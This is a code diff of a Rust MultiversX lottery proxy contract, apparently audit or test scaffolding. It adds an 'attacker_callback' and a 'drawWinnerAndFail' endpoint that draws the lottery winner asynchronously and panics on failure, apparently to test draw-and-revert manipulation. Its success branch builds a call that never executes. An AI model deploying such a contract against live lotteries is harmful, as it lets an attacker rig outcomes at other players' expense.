@@ -1,60 +1,59 @@
 multiversx_sc::imports!();
-use multiversx_sc::types::heap::Address;
 use lottery::ProxyTrait as _;
 pub const ONE_EGLD: u64 = 1_000_000_000_000_000_000;
 
 #[multiversx_sc::module]
 pub trait LotteryProxy {
     #[proxy]
-    fn lottery_contract_proxy(&self, lottery_sc_address: ManagedAddress) -> lottery::Proxy<Self::Api>;
+    fn lottery_contract_proxy(
+        &self,
+        lottery_sc_address: ManagedAddress,
+    ) -> lottery::Proxy<Self::Api>;
 
     #[payable("*EGLD")]
     #[endpoint(participate)]
-    fn participate(
-        &self,
-        lottery_sc_address: ManagedAddress
-    ) {
-        self
-            .send().direct_egld(&lottery_sc_address, &BigUint::from(ONE_EGLD))
+    fn participate(&self, lottery_sc_address: ManagedAddress) {
+        self.send()
+            .direct_egld(&lottery_sc_address, &BigUint::from(ONE_EGLD))
     }
 
     #[payable("EGLD")]
     #[endpoint(drawWinnerEndpoint)]
-    fn draw_winner_endpoint(
-        &self,
-        lottery_sc_address: ManagedAddress,
-        amount: BigUint
-    ) {
-        self
-            .lottery_contract_proxy(lottery_sc_address)
+    fn draw_winner_endpoint(&self, lottery_sc_address: ManagedAddress, amount: BigUint) {
+        self.lottery_contract_proxy(lottery_sc_address)
             .draw_winner()
             .with_egld_transfer(amount)
             .execute_on_dest_context()
     }
 
     #[payable("EGLD")]
-    #[endpoint]
-    fn fund_lottery(
-        &self,
-        amount: BigUint,
-        lottery_sc_address: ManagedAddress
-    ) {
-        self
-            .send().direct_egld(&lottery_sc_address, &amount);
+    #[endpoint(drawWinnerAndFail)]
+    fn attack_async(&self, lottery_sc_address: ManagedAddress) {
+        self.lottery_contract_proxy(lottery_sc_address.clone())
+            .draw_winner()
+            .async_call()
+            .with_callback(
+                self.callbacks()
+                    .attacker_callback(&lottery_sc_address),
+            )
+            .call_and_exit()
     }
 
     #[callback]
-    fn draw_winner_endpoint_callback(
+    fn attacker_callback(
         &self,
-        _caller: &Address,
-        #[call_result] result: ManagedAsyncCallResult<()>
-    ) -> CallbackClosure<Self::Api> {
+        address: &ManagedAddress,
+        #[call_result] result: ManagedAsyncCallResult<()>,
+    ) -> () {
         match result {
-            ManagedAsyncCallResult::Ok(()) => {
-                CallbackClosure::<Self::Api>::new("callback_name")
+            ManagedAsyncCallResult::Ok(value) => {
+                let _ = self.lottery_contract_proxy(address.clone())
+                    .draw_winner()
+                    .with_egld_transfer(BigUint::from(ONE_EGLD));
             }
-            ManagedAsyncCallResult::Err(_) => {
-                CallbackClosure::<Self::Api>::new("callback_name")
+            ManagedAsyncCallResult::Err(value) => {
+                let panic_message = value.err_msg;
+                panic!("{}", panic_message);
             }
         }
     }
